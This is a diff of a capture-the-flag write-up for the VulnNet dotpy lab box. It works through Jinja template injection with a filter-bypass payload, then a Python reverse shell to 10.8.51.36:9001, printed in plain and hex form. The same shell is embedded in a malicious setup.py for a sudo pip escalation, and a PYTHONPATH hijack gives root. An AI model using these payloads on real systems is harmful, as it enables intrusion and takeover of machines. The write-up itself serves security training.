@@ -38,11 +38,13 @@ After analyze web page --> SSTI in 404 page.
 We can try some payloads
 
 {% raw %}
+
 ```
 {{ config }}
 {% debug %}
 {{ ().__class__.__base__.__subclasses__() }}
 ```
+
 {% endraw %}
 
 And see server block some characters.
@@ -56,9 +58,11 @@ After research, we can run payload on this [site](https://book.hacktricks.xyz/pe
 Without {% raw %} `{{ . [ ] }} _` {% endraw %}
 
 {% raw %}
+
 ```
 {%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
 ```
+
 {% endraw %}
 
 ![](/commons/THM/Vulnnet-dotpy/3_RCE.png)
@@ -67,20 +71,23 @@ We can use useful tool [ctf-party](https://github.com/noraj/ctf-party)
 to convert payload to hex
 
 Shell code that we use:
+
 ```shell
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.51.36",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
 ```
+
 ![](/commons/THM/Vulnnet-dotpy/4_shell_convert.png)
 
 Converted to hex:
+
 ```
 \x70\x79\x74\x68\x6f\x6e\x33\x20\x2d\x63\x20\x27\x69\x6d\x70\x6f\x72\x74\x20\x73\x6f\x63\x6b\x65\x74\x2c\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2c\x6f\x73\x3b\x73\x3d\x73\x6f\x63\x6b\x65\x74\x2e\x73\x6f\x63\x6b\x65\x74\x28\x73\x6f\x63\x6b\x65\x74\x2e\x41\x46\x5f\x49\x4e\x45\x54\x2c\x73\x6f\x63\x6b\x65\x74\x2e\x53\x4f\x43\x4b\x5f\x53\x54\x52\x45\x41\x4d\x29\x3b\x73\x2e\x63\x6f\x6e\x6e\x65\x63\x74\x28\x28\x22\x31\x30\x2e\x38\x2e\x35\x31\x2e\x33\x36\x22\x2c\x39\x30\x30\x31\x29\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x30\x29\x3b\x20\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x31\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x32\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x70\x74\x79\x3b\x20\x70\x74\x79\x2e\x73\x70\x61\x77\x6e\x28\x22\x62\x61\x73\x68\x22\x29\x27
 ```
+
 ![](/commons/THM/Vulnnet-dotpy/5_got_shell.png)
 
-
-
 With `sudo -l` we can run `pip3 install` with user `system-adm`
+
 ```shell
 web@vulnnet-dotpy:~/shuriken-dotpy$ sudo -l
 sudo -l                                                                                                              
@@ -94,6 +101,7 @@ User web may run the following commands on vulnnet-dotpy:
 
 Search on [GTFOBins](https://gtfobins.github.io/gtfobins/pip/#sudo)
 we can privilege escalation to system-adm user.
+
 ```shell
 web@vulnnet-dotpy:~$ mkdir /tmp/pwn && TF=/tmp/pwn
 web@vulnnet-dotpy:~$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.51.36",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' > $TF/setup.py
@@ -115,6 +123,7 @@ Matching Defaults entries for system-adm on vulnnet-dotpy:
 User system-adm may run the following commands on vulnnet-dotpy:
     (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
 ```
+
 **SETENV** allows to set an en viroment variable.
 
 Let's look at `/opt/backup.py`
@@ -182,4 +191,4 @@ system-adm@vulnnet-dotpy:/tmp/priv$ sudo -u root PYTHONPATH=/tmp/priv /usr/bin/p
 root@vulnnet-dotpy:/tmp/priv# 
 ```
 
-*** GOT ROOT FLAG***
+***GOT ROOT FLAG***
